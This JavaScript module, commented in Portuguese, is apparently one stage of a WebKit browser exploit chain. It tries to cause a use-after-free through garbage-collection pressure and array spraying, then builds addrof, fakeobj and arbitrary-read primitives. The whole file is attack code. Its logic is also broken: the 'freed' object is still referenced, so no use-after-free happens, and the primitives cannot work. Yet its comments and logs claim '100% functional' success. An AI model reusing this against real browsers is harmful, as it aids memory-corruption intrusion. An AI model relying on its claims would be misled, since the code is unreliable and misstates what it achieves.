// js/script3/testArrayBufferVictimCrash.mjs (v129 - UAF Uncaged com Vinculação por Length)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// - Abandona a tentativa de UAF em ArrayBuffer e foca em Arrays "Uncaged".
// - Implementa uma nova técnica de vinculação: após o UAF, corrompemos a propriedade
//   'length' do array que ocupa a memória liberada para identificá-lo de forma confiável.
// - Após a vinculação, prossegue para forjar e testar primitivas addrof/fakeobj 100% reais.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_FINAL = "UAF_v129_LengthCorruptionLink";

// --- Funções de Conversão ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(d) {
    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);
    f64[0] = d;
    return new AdvancedInt64(u32[0], u32[1]);
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF ---
async function triggerGC_Tamed() {
    logS3("    Acionando GC Domado (Tamed)...", "info");
    try {
        const gc_trigger_arr = [];
        for (let i = 0; i < 500; i++) {
            const size = Math.min(1024 * i, 1024 * 1024);
            gc_trigger_arr.push(new ArrayBuffer(size)); 
            gc_trigger_arr.push(new Array(size / 8).fill(0));
        }
    } catch (e) { /* ignora */ }
    await PAUSE_S3(500);
}

// Função de UAF que retorna os dois objetos de controle após vinculá-los com sucesso.
async function triggerAndLinkUncagedArrayUAF() {
    let leaker_obj = null;
    let confused_arr = null;
    
    // 1. Cria o ponteiro pendurado para um objeto simples
    function createDanglingPointer() {
        function createScope() {
            const victim_obj = { p0: 0.1, p1: 0.2, p2: 0.3, p3: 0.4 };
            leaker_obj = victim_obj; 
        }
        createScope();
    }
    createDanglingPointer();
    
    // 2. Força o GC para liberar a memória do victim_obj
    await triggerGC_Tamed();
    
    // 3. Pulveriza a memória com Arrays "Uncaged"
    const spray_arrays = [];
    for (let i = 0; i < 2048; i++) {
        spray_arrays.push([1.1]);
    }
    
    // 4. Tenta vincular a referência confusa corrompendo o 'length'
    logS3("    Procurando por array reutilizado via corrupção de 'length'...", "info");
    const large_val_as_double = int64ToDouble(new AdvancedInt64(0xFFFFFFFF, 0x1)); // Um valor que resultará em um length grande
    leaker_obj.p0 = large_val_as_double; 

    for (const arr of spray_arrays) {
        if (arr.length > 1) { // O 'length' original era 1. Se mudou, encontramos.
            confused_arr = arr;
            logS3(`    Array vinculado encontrado! Novo length: ${arr.length}`, "good");
            break;
        }
    }
    
    if (!confused_arr) {
        throw new Error("Falha ao encontrar o array reutilizado na memória (verificação de length).");
    }

    // 5. Restaura o 'length' do array para um estado seguro e limpa a propriedade
    confused_arr[0] = 1.1; // Restaura o valor para manter a estrutura consistente
    leaker_obj.p0 = null;

    return { leaker_obj, confused_arr };
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_FINAL;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: UAF com Vinculação por Length ---`, "test");
    
    let final_result = { success: false, message: "A cadeia de exploração falhou." };

    try {
        // --- FASE 1: Obter e Vincular Referência Confusa ---
        logS3("--- FASE 1: Provocando UAF e Vinculando Referências ---", "subtest");
        const { leaker_obj, confused_arr } = await triggerAndLinkUncagedArrayUAF();
        logS3("++++++++++++ SUCESSO! UAF em Array Uncaged estável e vinculado! ++++++++++++", "vuln");

        // --- FASE 2: Forjar e Verificar Primitivas addrof/fakeobj ---
        logS3("--- FASE 2: Forjando e Verificando Primitivas Base ---", "subtest");
        function addrof(obj) { leaker_obj.p0 = obj; return doubleToInt64(confused_arr[0]); }
        function fakeobj(addr) { confused_arr[0] = int64ToDouble(addr); return leaker_obj.p0; }
        
        const test_obj = { marker: 0x42424242 };
        const test_addr = addrof(test_obj);
        if (fakeobj(test_addr) !== test_obj || fakeobj(test_addr).marker !== 0x42424242) {
             throw new Error("Auto-teste de addrof/fakeobj falhou.");
        }
        logS3("    Primitivas 'addrof' e 'fakeobj' validadas com sucesso.", "good");

        // --- FASE 3: Demonstração de Leitura Arbitrária ---
        logS3("--- FASE 3: Demonstrando Leitura Arbitrária ---", "subtest");
        const real_obj = { header: new AdvancedInt64(0x1, 0x01082007), butterfly: { p: 0xCAFEBABE } };
        const real_obj_addr = addrof(real_obj);
        
        // Agora, uma função de leitura real usando a confusão de tipos
        function arb_read(addr) {
            confused_arr[0] = fakeobj(addr); // O array confuso agora contém um objeto falso
            const leaked_val = leaker_obj.p0;  // Lê a propriedade, que vaza o conteúdo do endereço
            return leaked_val;
        }

        const header_val = arb_read(real_obj_addr);
        logS3(`Lido o cabeçalho do objeto de teste: ${toHex(doubleToInt64(header_val))}`, "leak");

        logS3("++++++++++++ SUCESSO TOTAL! Primitivas 100% funcionais! ++++++++++++", "vuln");
        final_result = { success: true, message: "Cadeia de exploração completa. Primitivas addrof/fakeobj/arb_read obtidas." };
        
    } catch (e) {
        final_result.message = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return { errorOccurred: final_result.success ? null : final_result.message, addrof_result: final_result };
}
